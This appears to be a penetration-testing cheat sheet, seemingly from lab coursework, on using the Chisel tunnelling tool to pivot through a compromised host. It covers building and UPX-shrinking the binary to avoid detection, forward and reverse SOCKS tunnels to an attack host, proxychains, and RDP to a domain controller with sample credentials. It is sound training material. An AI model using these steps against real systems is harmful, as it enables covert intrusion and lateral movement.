> [Chisel](https://github.com/jpillora/chisel) is a TCP/UDP-based tunneling tool written in [Go](https://go.dev/) that uses HTTP to transport data that is secured using SSH.
> `Chisel` can create a client-server tunnel connection in a firewall restricted environment.


[Useful guide](https://0xdf.gitlab.io/cheatsheets/chisel)
## Setting Up & Using Chisel

#### Cloning Chisel
```python
git clone https://github.com/jpillora/chisel.git
```

> **Note:** Depending on the version of the `glibc` library installed on both (target and workstation) systems, there might be discrepancies that could result in an error. When this happens, it is important to compare the versions of the library on both systems, or we can use an older prebuilt version of `chisel`, which can be found in the `Releases` section of the GitHub repository.

#### Building the Chisel Binary
```python
cd chisel
go build
```

- It can be beneficial to be mindful of the size of the binary to prevent detection.
- Ipp sec video doing the same

#### Pro tip
```python
du -hs <filename>
#This will show us the size of the file
```
#### Stripping down go binaries to reduce size

```python
go build -ldflags=" -s -w" #strips down debug info and dwarf information.

upx brute chisel #further decreases the file size while still maintaining functionality
```

#### Transferring Chisel Binary to Pivot Host
```python
scp chisel ubuntu@10.129.27.248:~/
```

#### Running the Chisel Server on the Pivot Host
```python
./chisel server -v -p 1234 --socks5
```
- Chisel server will wait for incoming connections on port `1234` and forward it to all the networks that are accessible from the pivot host.

#### Connecting to the Chisel Server
```python
./chisel client -v 10.129.202.64:1234 socks
```

Chisel client has created a TCP/UDP tunnel via HTTP secured using SSH between the Chisel server and the client and has started listening on port `1080`.

- We need to modify `/etc/proxychains.conf` and add `1080` port at the end so we can use proxychains to pivot using the created tunnel between the 1080 port and the SSH tunnel.

#### Pivoting to the DC
```python
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

## Chisel Reverse Pivot
There may be scenarios where firewall rules restrict inbound connections to our compromised target. In such cases, we can use Chisel with the reverse option.

**When the Chisel server has `--reverse` enabled, remotes can be prefixed with `R` to denote reversed.**

#### Starting the Chisel Server on our Attack Host
```python
sudo ./chisel server --reverse -v -p 1234 --socks5
```

#### Connecting the Chisel Client to our Attack Host
```python
./chisel client -v 10.10.15.176:1234 R:socks
```
